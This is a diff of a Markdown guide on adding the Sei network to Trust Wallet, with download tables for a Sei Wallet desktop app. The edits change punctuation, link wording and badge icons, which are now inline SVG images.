@@ -5,25 +5,29 @@
 <p align="center">Set the network up in Trust Wallet, or hold SEI where staking works.</p>
 
 <p align="center">
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
   <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
 </p>
+
+<div align="center">
 
 | Platform | Requirements | File |
 |:--|:--|:--|
-| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).
 
 > [!WARNING]
 > Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.
 
-Trust Wallet is a general EVM wallet: it ships with a set of networks and lets you add others. Sei is added as a custom EVM network — chain ID 1329, the public Sei RPC from Sei's documentation, symbol SEI — after which the wallet can hold and send SEI like any other EVM asset.
+Trust Wallet is a general EVM wallet: it ships with a set of networks and lets you add others. Sei is added as a custom EVM network - chain ID 1329, the public Sei RPC from Sei's documentation, symbol SEI - after which the wallet can hold and send SEI like any other EVM asset.
 
-That works, and it is a reasonable choice if you already use Trust Wallet for other chains. What it does not give you is staking, an unbonding view, or a Sei-specific interface; those are what [the desktop alternative](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) is for.
+That works, and it is a reasonable choice if you already use Trust Wallet for other chains. What it does not give you is staking, an unbonding view, or a Sei-specific interface; those are what [the Sei Wallet desktop app](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) is for.
 
 ## What "adding a network" means
 
@@ -31,29 +35,29 @@ A network entry is four or five fields: name, RPC endpoint, chain ID, currency s
 
 Get one field wrong and the symptoms are specific:
 
-- **Wrong chain ID** — transactions are rejected, or signed for a network that does not know your account.
-- **Wrong RPC** — the wallet connects but shows stale or empty data.
-- **Wrong symbol** — cosmetic, but confusing when a balance displays with the wrong ticker.
+- **Wrong chain ID** - transactions are rejected, or signed for a network that does not know your account.
+- **Wrong RPC** - the wallet connects but shows stale or empty data.
+- **Wrong symbol** - cosmetic, but confusing when a balance displays with the wrong ticker.
 
 The values are published in Sei's documentation, which is the authority here because endpoints change. The two forms of an address are a separate question, covered in [the dual address question](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md).
 
 ## The address you get
 
-An EVM wallet derives an address from your phrase using the Ethereum path, so the address it shows for Sei is the same `0x…` address any EVM-first application would show for that phrase. That is a feature: your Sei account is not tied to a wallet.
+An EVM wallet derives an address from your phrase using the Ethereum path, so the address it shows for Sei is the same `0x...` address any EVM-first application would show for that phrase. That is a feature: your Sei account is not tied to a wallet.
 
 Two consequences:
 
-- **Importing the same phrase into this desktop app should show the same `0x…` account**, because both use the EVM derivation. If it does not, the derivation differs, and the fix is to add accounts until the expected address appears.
-- **A `sei1…` address is a different representation of the same account**, not a second wallet. Sending to it from an EVM wallet is a route most interfaces cannot complete, which is why the form matters.
+- **Importing the same phrase into this desktop app should show the same `0x...` account**, because both use the EVM derivation. If it does not, the derivation differs, and the fix is to add accounts until the expected address appears.
+- **A `sei1...` address is a different representation of the same account**, not a second wallet. Sending to it from an EVM wallet is a route most interfaces cannot complete, which is why the form matters.
 
-If you migrated from a Cosmos-first wallet, you may be holding a `sei1…` account whose funds are not visible in an EVM wallet until the association exists. The two-address-form problem is the article for that state, and it is the single most common reason a "correct" address shows an empty balance.
+If you migrated from a Cosmos-first wallet, you may be holding a `sei1...` account whose funds are not visible in an EVM wallet until the association exists. The two-address-form problem is the article for that state, and it is the single most common reason a "correct" address shows an empty balance.
 
 ## Adding Sei, step by step
 
 1. Open the wallet's network management screen and choose to add a custom network.
 2. Enter the network name, the RPC endpoint, chain ID 1329, symbol SEI, and the explorer URL from Sei's documentation.
 3. Save, then switch to the new network.
-4. Copy the receive address **after** switching — the address field changes with the network in some wallets, and copying before switching is how people send to the wrong chain.
+4. Copy the receive address **after** switching - the address field changes with the network in some wallets, and copying before switching is how people send to the wrong chain.
 5. Send a small test amount from wherever your SEI currently sits.
 6. Confirm it appears and is spendable before moving the rest.
 
@@ -77,11 +81,11 @@ None of that makes it unsafe. It makes it narrow.
 
 **Sending on the wrong network.** With several networks in one wallet, the selected network is a setting people forget. The transfer is final on whichever chain it was sent on.
 
-**A copy-pasted address from another chain.** EVM addresses look identical across chains, so an address copied from an Ethereum session is a valid Sei address too — for a different account, if it was never yours on Sei.
+**A copy-pasted address from another chain.** EVM addresses look identical across chains, so an address copied from an Ethereum session is a valid Sei address too - for a different account, if it was never yours on Sei.
 
 **A lookalike network entry.** Anyone can publish a chain-ID-and-RPC pair. A malicious RPC can show you false balances and false confirmations; it cannot sign for you, but it can mislead you. Add networks from documentation, not from a message.
 
-**Assuming a pending deposit is lost.** Exchanges wait for confirmations, and wallets sometimes lag. [A pending transfer](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) is usually a waiting problem rather than a loss.
+**Assuming a pending deposit is lost.** Exchanges wait for confirmations, and wallets sometimes lag. [A pending Sei Wallet transaction](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) is usually a waiting problem rather than a loss.
 
 ## Which to use
 
@@ -97,7 +101,7 @@ The MetaMask route has its own setup and its own traps, and [the MetaMask approa
 
 **Does Trust Wallet support Sei?** It supports custom EVM networks, so Sei can be added with chain ID 1329 and Sei's RPC. Check the current app version for the exact menu path, since interfaces change.
 
-**Will my address be the same as in Sei Wallet?** The `0x…` address should be, if both use the Ethereum derivation. A different address means a different derivation, not a different account of yours.
+**Will my address be the same as in Sei Wallet?** The `0x...` address should be, if both use the Ethereum derivation. A different address means a different derivation, not a different account of yours.
 
 **Can I stake from Trust Wallet?** Not through a Sei staking interface; delegation needs an interface that supports it. Holding and sending work normally.
 
@@ -105,17 +109,21 @@ The MetaMask route has its own setup and its own traps, and [the MetaMask approa
 
 **Which is safer?** Neither by construction. Both sign with keys on your device, and both depend on you verifying what you approve.
 
-**Do I need to add Sei to receive it?** Yes — the network entry has to exist before the wallet can display the balance, even though the funds are already at the address on-chain.
+**Do I need to add Sei to receive it?** Yes - the network entry has to exist before the wallet can display the balance, even though the funds are already at the address on-chain.
 
 **What if the balance shows zero after adding?** Confirm the network is selected, the chain ID is 1329, and the account is the one you expect. [The EVM compatibility article](https://github.com/sei-chain/sei-wallet-setup/blob/main/evm-compatibility-explained.md) explains what a compatible EVM wallet should and should not be able to do on Sei.
 
 ## Download Sei Wallet
 
+<div align="center">
+
 | Platform | Installer |
 |:--|:--|
-| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.
 
